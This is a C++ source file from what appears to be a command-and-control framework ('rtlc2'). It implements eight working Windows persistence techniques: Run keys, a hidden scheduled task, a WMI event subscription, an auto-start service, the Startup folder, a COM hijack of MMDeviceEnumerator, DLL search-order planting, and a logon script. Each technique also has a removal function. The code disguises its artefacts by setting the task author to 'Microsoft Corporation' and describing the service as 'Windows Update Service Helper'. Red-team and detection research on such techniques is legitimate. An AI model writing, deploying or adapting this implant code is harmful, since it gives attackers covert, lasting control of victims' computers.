// persistence_win.cpp - Windows persistence techniques
// Implements: RegistryRunKey, ScheduledTask, WMISubscription, ServiceInstall,
//             StartupFolder, COMHijack, DLLSearchOrder, RegistryLogonScript

#ifdef RTLC2_WINDOWS

#include "persistence.h"

#include <windows.h>
#include <shlobj.h>
#include <taskschd.h>
#include <comdef.h>
#include <wbemidl.h>
#include <winsvc.h>
#include <string>
#include <vector>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")
#pragma comment(lib, "wbemuuid.lib")

namespace rtlc2 {
namespace persistence {

// ---- Helpers ----

static std::wstring ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring ws(len, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &ws[0], len);
    return ws;
}

static std::string FromWide(const std::wstring& ws) {
    if (ws.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), nullptr, 0, nullptr, nullptr);
    std::string s(len, 0);
    WideCharToMultiByte(CP_UTF8, 0, ws.c_str(), (int)ws.size(), &s[0], len, nullptr, nullptr);
    return s;
}

static std::string LastErrorStr() {
    DWORD err = GetLastError();
    char buf[256];
    snprintf(buf, sizeof(buf), " (error %lu)", err);
    return std::string(buf);
}

// ====================================================================
// 1. Registry Run Key
// ====================================================================

PersistResult InstallRegistryRunKey(const PersistConfig& cfg) {
    HKEY hRoot = cfg.hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    const wchar_t* subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExW(hRoot, subKey, 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        return {false, "Failed to open Run key" + LastErrorStr(), cfg.technique};
    }

    std::wstring valueName = ToWide(cfg.name);
    std::wstring valueData = ToWide(cfg.payload_path);
    if (!cfg.args.empty()) {
        valueData += L" " + ToWide(cfg.args);
    }

    res = RegSetValueExW(hKey, valueName.c_str(), 0, REG_SZ,
                         (const BYTE*)valueData.c_str(),
                         (DWORD)((valueData.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        return {false, "Failed to set Run value" + LastErrorStr(), cfg.technique};
    }

    return {true, "Registry Run key installed: " + cfg.name + " -> " + cfg.payload_path,
            cfg.technique};
}

PersistResult RemoveRegistryRunKey(const PersistConfig& cfg) {
    HKEY hRoot = cfg.hklm ? HKEY_LOCAL_MACHINE : HKEY_CURRENT_USER;
    const wchar_t* subKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExW(hRoot, subKey, 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        return {false, "Failed to open Run key for removal" + LastErrorStr(), cfg.technique};
    }

    std::wstring valueName = ToWide(cfg.name);
    res = RegDeleteValueW(hKey, valueName.c_str());
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        return {false, "Failed to delete Run value '" + cfg.name + "'" + LastErrorStr(),
                cfg.technique};
    }

    return {true, "Registry Run key removed: " + cfg.name, cfg.technique};
}

// ====================================================================
// 2. Scheduled Task (COM Task Scheduler 2.0)
// ====================================================================

PersistResult InstallScheduledTask(const PersistConfig& cfg) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coinitOwned = SUCCEEDED(hr);

    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        if (coinitOwned) CoUninitialize();
        return {false, "CoCreateInstance(TaskScheduler) failed", cfg.technique};
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "TaskService Connect failed", cfg.technique};
    }

    ITaskFolder* pRootFolder = nullptr;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "GetFolder failed", cfg.technique};
    }

    // Delete existing task with same name (ignore errors)
    pRootFolder->DeleteTask(_bstr_t(ToWide(cfg.name).c_str()), 0);

    ITaskDefinition* pTask = nullptr;
    hr = pService->NewTask(0, &pTask);
    if (FAILED(hr)) {
        pRootFolder->Release();
        pService->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "NewTask failed", cfg.technique};
    }

    // Registration info
    IRegistrationInfo* pRegInfo = nullptr;
    pTask->get_RegistrationInfo(&pRegInfo);
    if (pRegInfo) {
        pRegInfo->put_Author(_bstr_t(L"Microsoft Corporation"));
        pRegInfo->Release();
    }

    // Principal (run with highest available privilege)
    IPrincipal* pPrincipal = nullptr;
    pTask->get_Principal(&pPrincipal);
    if (pPrincipal) {
        pPrincipal->put_RunLevel(TASK_RUNLEVEL_HIGHEST);
        pPrincipal->put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN);
        pPrincipal->Release();
    }

    // Settings
    ITaskSettings* pSettings = nullptr;
    pTask->get_Settings(&pSettings);
    if (pSettings) {
        pSettings->put_StartWhenAvailable(VARIANT_TRUE);
        pSettings->put_DisallowStartIfOnBatteries(VARIANT_FALSE);
        pSettings->put_StopIfGoingOnBatteries(VARIANT_FALSE);
        pSettings->put_Hidden(VARIANT_TRUE);
        pSettings->Release();
    }

    // Trigger: logon
    ITriggerCollection* pTriggerCollection = nullptr;
    pTask->get_Triggers(&pTriggerCollection);
    if (pTriggerCollection) {
        ITrigger* pTrigger = nullptr;
        pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
        if (pTrigger) pTrigger->Release();
        pTriggerCollection->Release();
    }

    // Action: exec
    IActionCollection* pActionCollection = nullptr;
    pTask->get_Actions(&pActionCollection);
    if (pActionCollection) {
        IAction* pAction = nullptr;
        pActionCollection->Create(TASK_ACTION_EXEC, &pAction);
        if (pAction) {
            IExecAction* pExecAction = nullptr;
            pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
            if (pExecAction) {
                pExecAction->put_Path(_bstr_t(ToWide(cfg.payload_path).c_str()));
                if (!cfg.args.empty()) {
                    pExecAction->put_Arguments(_bstr_t(ToWide(cfg.args).c_str()));
                }
                pExecAction->Release();
            }
            pAction->Release();
        }
        pActionCollection->Release();
    }

    // Register
    IRegisteredTask* pRegisteredTask = nullptr;
    hr = pRootFolder->RegisterTaskDefinition(
        _bstr_t(ToWide(cfg.name).c_str()),
        pTask,
        TASK_CREATE_OR_UPDATE,
        _variant_t(),
        _variant_t(),
        TASK_LOGON_INTERACTIVE_TOKEN,
        _variant_t(L""),
        &pRegisteredTask);

    bool ok = SUCCEEDED(hr);
    std::string msg = ok
        ? "Scheduled task created: " + cfg.name
        : "RegisterTaskDefinition failed (HRESULT 0x" +
          std::to_string((unsigned long)hr) + ")";

    if (pRegisteredTask) pRegisteredTask->Release();
    pTask->Release();
    pRootFolder->Release();
    pService->Release();
    if (coinitOwned) CoUninitialize();

    return {ok, msg, cfg.technique};
}

PersistResult RemoveScheduledTask(const PersistConfig& cfg) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coinitOwned = SUCCEEDED(hr);

    ITaskService* pService = nullptr;
    hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER,
                          IID_ITaskService, (void**)&pService);
    if (FAILED(hr)) {
        if (coinitOwned) CoUninitialize();
        return {false, "CoCreateInstance failed for removal", cfg.technique};
    }

    hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
    if (FAILED(hr)) {
        pService->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "TaskService Connect failed for removal", cfg.technique};
    }

    ITaskFolder* pRootFolder = nullptr;
    hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
    if (FAILED(hr)) {
        pService->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "GetFolder failed for removal", cfg.technique};
    }

    hr = pRootFolder->DeleteTask(_bstr_t(ToWide(cfg.name).c_str()), 0);
    bool ok = SUCCEEDED(hr);

    pRootFolder->Release();
    pService->Release();
    if (coinitOwned) CoUninitialize();

    return {ok, ok ? "Scheduled task deleted: " + cfg.name
                   : "Failed to delete scheduled task: " + cfg.name,
            cfg.technique};
}

// ====================================================================
// 3. WMI Event Subscription
// ====================================================================

static HRESULT WMIPutInstance(IWbemServices* pSvc, const wchar_t* className,
                               const std::vector<std::pair<std::wstring, std::wstring>>& props) {
    IWbemClassObject* pClass = nullptr;
    HRESULT hr = pSvc->GetObject(_bstr_t(className), 0, nullptr, &pClass, nullptr);
    if (FAILED(hr)) return hr;

    IWbemClassObject* pInstance = nullptr;
    hr = pClass->SpawnInstance(0, &pInstance);
    pClass->Release();
    if (FAILED(hr)) return hr;

    for (auto& kv : props) {
        VARIANT v;
        VariantInit(&v);
        v.vt = VT_BSTR;
        v.bstrVal = SysAllocString(kv.second.c_str());
        pInstance->Put(kv.first.c_str(), 0, &v, 0);
        VariantClear(&v);
    }

    hr = pSvc->PutInstance(pInstance, WBEM_FLAG_CREATE_OR_UPDATE, nullptr, nullptr);
    pInstance->Release();
    return hr;
}

static HRESULT WMIDeleteInstance(IWbemServices* pSvc, const std::wstring& objectPath) {
    return pSvc->DeleteInstance(_bstr_t(objectPath.c_str()), 0, nullptr, nullptr);
}

PersistResult InstallWMISubscription(const PersistConfig& cfg) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coinitOwned = SUCCEEDED(hr);

    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                               RPC_C_AUTHN_LEVEL_DEFAULT,
                               RPC_C_IMP_LEVEL_IMPERSONATE,
                               nullptr, EOAC_NONE, nullptr);

    IWbemLocator* pLoc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) {
        if (coinitOwned) CoUninitialize();
        return {false, "WbemLocator CoCreateInstance failed", cfg.technique};
    }

    IWbemServices* pSvc = nullptr;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), nullptr, nullptr,
                              nullptr, 0, nullptr, nullptr, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "ConnectServer(ROOT\\subscription) failed", cfg.technique};
    }

    hr = CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                            RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                            nullptr, EOAC_NONE);

    std::wstring filterName = ToWide(cfg.name) + L"_Filter";
    std::wstring consumerName = ToWide(cfg.name) + L"_Consumer";

    // Create __EventFilter (fires every 300 seconds)
    std::wstring query = L"SELECT * FROM __InstanceModificationEvent WITHIN 300 "
                         L"WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'";
    hr = WMIPutInstance(pSvc, L"__EventFilter", {
        {L"Name", filterName},
        {L"EventNamespace", L"root\\cimv2"},
        {L"QueryLanguage", L"WQL"},
        {L"Query", query}
    });

    if (FAILED(hr)) {
        pSvc->Release(); pLoc->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "Failed to create __EventFilter", cfg.technique};
    }

    // Create CommandLineEventConsumer
    std::wstring cmdLine = ToWide(cfg.payload_path);
    if (!cfg.args.empty()) {
        cmdLine += L" " + ToWide(cfg.args);
    }
    hr = WMIPutInstance(pSvc, L"CommandLineEventConsumer", {
        {L"Name", consumerName},
        {L"CommandLineTemplate", cmdLine}
    });

    if (FAILED(hr)) {
        // Rollback filter
        WMIDeleteInstance(pSvc, L"__EventFilter.Name=\"" + filterName + L"\"");
        pSvc->Release(); pLoc->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "Failed to create CommandLineEventConsumer", cfg.technique};
    }

    // Create __FilterToConsumerBinding
    std::wstring filterPath = L"__EventFilter.Name=\"" + filterName + L"\"";
    std::wstring consumerPath = L"CommandLineEventConsumer.Name=\"" + consumerName + L"\"";
    hr = WMIPutInstance(pSvc, L"__FilterToConsumerBinding", {
        {L"Filter", filterPath},
        {L"Consumer", consumerPath}
    });

    bool ok = SUCCEEDED(hr);
    pSvc->Release();
    pLoc->Release();
    if (coinitOwned) CoUninitialize();

    return {ok, ok ? "WMI subscription created: " + cfg.name
                   : "Failed to create __FilterToConsumerBinding",
            cfg.technique};
}

PersistResult RemoveWMISubscription(const PersistConfig& cfg) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    bool coinitOwned = SUCCEEDED(hr);

    IWbemLocator* pLoc = nullptr;
    hr = CoCreateInstance(CLSID_WbemLocator, nullptr, CLSCTX_INPROC_SERVER,
                          IID_IWbemLocator, (void**)&pLoc);
    if (FAILED(hr)) {
        if (coinitOwned) CoUninitialize();
        return {false, "WbemLocator CoCreateInstance failed", cfg.technique};
    }

    IWbemServices* pSvc = nullptr;
    hr = pLoc->ConnectServer(_bstr_t(L"ROOT\\subscription"), nullptr, nullptr,
                              nullptr, 0, nullptr, nullptr, &pSvc);
    if (FAILED(hr)) {
        pLoc->Release();
        if (coinitOwned) CoUninitialize();
        return {false, "ConnectServer failed for removal", cfg.technique};
    }

    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, nullptr,
                       RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE,
                       nullptr, EOAC_NONE);

    std::wstring filterName = ToWide(cfg.name) + L"_Filter";
    std::wstring consumerName = ToWide(cfg.name) + L"_Consumer";

    // Delete binding first, then consumer and filter
    std::wstring bindingPath = L"__FilterToConsumerBinding.Filter=\"__EventFilter.Name=\\\"" +
                               filterName + L"\\\"\",Consumer=\"CommandLineEventConsumer.Name=\\\"" +
                               consumerName + L"\\\"\"";
    WMIDeleteInstance(pSvc, bindingPath);
    WMIDeleteInstance(pSvc, L"CommandLineEventConsumer.Name=\"" + consumerName + L"\"");
    WMIDeleteInstance(pSvc, L"__EventFilter.Name=\"" + filterName + L"\"");

    pSvc->Release();
    pLoc->Release();
    if (coinitOwned) CoUninitialize();

    return {true, "WMI subscription removed: " + cfg.name, cfg.technique};
}

// ====================================================================
// 4. Service Install
// ====================================================================

PersistResult InstallService(const PersistConfig& cfg) {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!hSCM) {
        return {false, "OpenSCManager failed" + LastErrorStr(), cfg.technique};
    }

    std::wstring svcName = ToWide(cfg.name);
    std::wstring displayName = ToWide(cfg.name + " Service");
    std::wstring binPath = ToWide(cfg.payload_path);
    if (!cfg.args.empty()) {
        binPath += L" " + ToWide(cfg.args);
    }

    SC_HANDLE hSvc = CreateServiceW(
        hSCM,
        svcName.c_str(),
        displayName.c_str(),
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,
        SERVICE_ERROR_IGNORE,
        binPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!hSvc) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        if (err == ERROR_SERVICE_EXISTS) {
            return {true, "Service already exists: " + cfg.name, cfg.technique};
        }
        return {false, "CreateService failed" + LastErrorStr(), cfg.technique};
    }

    // Optionally set description
    SERVICE_DESCRIPTIONW desc;
    std::wstring descStr = L"Windows Update Service Helper";
    desc.lpDescription = (LPWSTR)descStr.c_str();
    ChangeServiceConfig2W(hSvc, SERVICE_CONFIG_DESCRIPTION, &desc);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return {true, "Service installed: " + cfg.name + " (AUTO_START)", cfg.technique};
}

PersistResult RemoveService(const PersistConfig& cfg) {
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return {false, "OpenSCManager failed" + LastErrorStr(), cfg.technique};
    }

    std::wstring svcName = ToWide(cfg.name);
    SC_HANDLE hSvc = OpenServiceW(hSCM, svcName.c_str(), DELETE | SERVICE_STOP);
    if (!hSvc) {
        CloseServiceHandle(hSCM);
        return {false, "OpenService failed for '" + cfg.name + "'" + LastErrorStr(),
                cfg.technique};
    }

    // Try to stop first
    SERVICE_STATUS status;
    ControlService(hSvc, SERVICE_CONTROL_STOP, &status);

    BOOL ok = DeleteService(hSvc);
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    return {ok != FALSE,
            ok ? "Service deleted: " + cfg.name
               : "DeleteService failed" + LastErrorStr(),
            cfg.technique};
}

// ====================================================================
// 5. Startup Folder
// ====================================================================

PersistResult InstallStartupFolder(const PersistConfig& cfg) {
    wchar_t startupPath[MAX_PATH];
    HRESULT hr = SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath);
    if (FAILED(hr)) {
        return {false, "SHGetFolderPath(CSIDL_STARTUP) failed", cfg.technique};
    }

    // Build destination path: startup\<name>.exe (or .lnk)
    std::wstring src = ToWide(cfg.payload_path);
    std::wstring dst = std::wstring(startupPath) + L"\\" + ToWide(cfg.name);

    // If source has an extension, preserve it; otherwise append .exe
    auto dotPos = src.rfind(L'.');
    if (dotPos != std::wstring::npos) {
        dst += src.substr(dotPos);
    } else {
        dst += L".exe";
    }

    BOOL ok = CopyFileW(src.c_str(), dst.c_str(), FALSE);
    if (!ok) {
        return {false, "CopyFile to Startup folder failed" + LastErrorStr(), cfg.technique};
    }

    return {true, "Copied to Startup folder: " + FromWide(dst), cfg.technique};
}

PersistResult RemoveStartupFolder(const PersistConfig& cfg) {
    wchar_t startupPath[MAX_PATH];
    HRESULT hr = SHGetFolderPathW(nullptr, CSIDL_STARTUP, nullptr, 0, startupPath);
    if (FAILED(hr)) {
        return {false, "SHGetFolderPath failed", cfg.technique};
    }

    // Try common extensions
    std::wstring base = std::wstring(startupPath) + L"\\" + ToWide(cfg.name);
    const wchar_t* exts[] = {L".exe", L".lnk", L".bat", L".vbs", L".dll", L""};
    for (auto ext : exts) {
        std::wstring path = base + ext;
        if (DeleteFileW(path.c_str())) {
            return {true, "Removed from Startup folder: " + FromWide(path), cfg.technique};
        }
    }

    return {false, "File not found in Startup folder for '" + cfg.name + "'", cfg.technique};
}

// ====================================================================
// 6. COM Hijack (MMDeviceEnumerator - loaded by many processes)
// ====================================================================

static const wchar_t* kCOMHijackCLSID =
    L"Software\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}\\InprocServer32";

PersistResult InstallCOMHijack(const PersistConfig& cfg) {
    HKEY hKey = nullptr;
    LONG res = RegCreateKeyExW(HKEY_CURRENT_USER, kCOMHijackCLSID, 0, nullptr,
                                REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, nullptr,
                                &hKey, nullptr);
    if (res != ERROR_SUCCESS) {
        return {false, "Failed to create COM hijack key" + LastErrorStr(), cfg.technique};
    }

    std::wstring dllPath = ToWide(cfg.payload_path);

    // Set default value to DLL path
    res = RegSetValueExW(hKey, nullptr, 0, REG_SZ,
                         (const BYTE*)dllPath.c_str(),
                         (DWORD)((dllPath.size() + 1) * sizeof(wchar_t)));
    if (res != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return {false, "Failed to set COM hijack DLL path" + LastErrorStr(), cfg.technique};
    }

    // Set ThreadingModel
    std::wstring threadModel = L"Both";
    RegSetValueExW(hKey, L"ThreadingModel", 0, REG_SZ,
                   (const BYTE*)threadModel.c_str(),
                   (DWORD)((threadModel.size() + 1) * sizeof(wchar_t)));

    RegCloseKey(hKey);

    return {true, "COM hijack installed (MMDeviceEnumerator -> " + cfg.payload_path + ")",
            cfg.technique};
}

PersistResult RemoveCOMHijack(const PersistConfig& cfg) {
    // Delete the InprocServer32 key and its parent CLSID key under HKCU
    LONG res = RegDeleteTreeW(HKEY_CURRENT_USER, kCOMHijackCLSID);
    if (res != ERROR_SUCCESS && res != ERROR_FILE_NOT_FOUND) {
        return {false, "Failed to delete COM hijack key" + LastErrorStr(), cfg.technique};
    }

    // Also try to clean up the parent CLSID key
    RegDeleteKeyW(HKEY_CURRENT_USER,
        L"Software\\Classes\\CLSID\\{BCDE0395-E52F-467C-8E3D-C4579291692E}");

    return {true, "COM hijack removed (MMDeviceEnumerator)", cfg.technique};
}

// ====================================================================
// 7. DLL Search Order Hijack
// ====================================================================

PersistResult InstallDLLSearchOrder(const PersistConfig& cfg) {
    if (cfg.payload_path.empty()) {
        return {false, "DLL search order: payload_path (source DLL) required", cfg.technique};
    }
    if (cfg.args.empty()) {
        return {false, "DLL search order: args (target app directory) required", cfg.technique};
    }

    std::wstring srcDll = ToWide(cfg.payload_path);

    // Extract DLL filename from source path
    auto lastSlash = srcDll.rfind(L'\\');
    if (lastSlash == std::wstring::npos) lastSlash = srcDll.rfind(L'/');
    std::wstring dllName = (lastSlash != std::wstring::npos)
        ? srcDll.substr(lastSlash + 1) : srcDll;

    // Target directory from args
    std::wstring targetDir = ToWide(cfg.args);
    if (targetDir.back() != L'\\') targetDir += L'\\';
    std::wstring dstPath = targetDir + dllName;

    BOOL ok = CopyFileW(srcDll.c_str(), dstPath.c_str(), FALSE);
    if (!ok) {
        return {false, "Failed to copy DLL to target directory" + LastErrorStr(), cfg.technique};
    }

    return {true, "DLL planted: " + FromWide(dstPath), cfg.technique};
}

PersistResult RemoveDLLSearchOrder(const PersistConfig& cfg) {
    if (cfg.payload_path.empty() || cfg.args.empty()) {
        return {false, "DLL search order removal: need payload_path and args (target dir)",
                cfg.technique};
    }

    std::wstring srcDll = ToWide(cfg.payload_path);
    auto lastSlash = srcDll.rfind(L'\\');
    if (lastSlash == std::wstring::npos) lastSlash = srcDll.rfind(L'/');
    std::wstring dllName = (lastSlash != std::wstring::npos)
        ? srcDll.substr(lastSlash + 1) : srcDll;

    std::wstring targetDir = ToWide(cfg.args);
    if (targetDir.back() != L'\\') targetDir += L'\\';
    std::wstring dstPath = targetDir + dllName;

    BOOL ok = DeleteFileW(dstPath.c_str());
    return {ok != FALSE,
            ok ? "DLL removed: " + FromWide(dstPath)
               : "Failed to remove DLL" + LastErrorStr(),
            cfg.technique};
}

// ====================================================================
// 8. Registry Logon Script (UserInitMprLogonScript)
// ====================================================================

PersistResult InstallRegistryLogonScript(const PersistConfig& cfg) {
    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        return {false, "Failed to open HKCU\\Environment" + LastErrorStr(), cfg.technique};
    }

    std::wstring script = ToWide(cfg.payload_path);
    if (!cfg.args.empty()) {
        script += L" " + ToWide(cfg.args);
    }

    res = RegSetValueExW(hKey, L"UserInitMprLogonScript", 0, REG_SZ,
                         (const BYTE*)script.c_str(),
                         (DWORD)((script.size() + 1) * sizeof(wchar_t)));
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        return {false, "Failed to set UserInitMprLogonScript" + LastErrorStr(), cfg.technique};
    }

    return {true, "Logon script installed: " + cfg.payload_path, cfg.technique};
}

PersistResult RemoveRegistryLogonScript(const PersistConfig& cfg) {
    HKEY hKey = nullptr;
    LONG res = RegOpenKeyExW(HKEY_CURRENT_USER, L"Environment", 0, KEY_SET_VALUE, &hKey);
    if (res != ERROR_SUCCESS) {
        return {false, "Failed to open HKCU\\Environment" + LastErrorStr(), cfg.technique};
    }

    res = RegDeleteValueW(hKey, L"UserInitMprLogonScript");
    RegCloseKey(hKey);

    if (res != ERROR_SUCCESS) {
        return {false, "Failed to delete UserInitMprLogonScript" + LastErrorStr(), cfg.technique};
    }

    return {true, "Logon script removed", cfg.technique};
}

} // namespace persistence
} // namespace rtlc2

#endif // RTLC2_WINDOWS
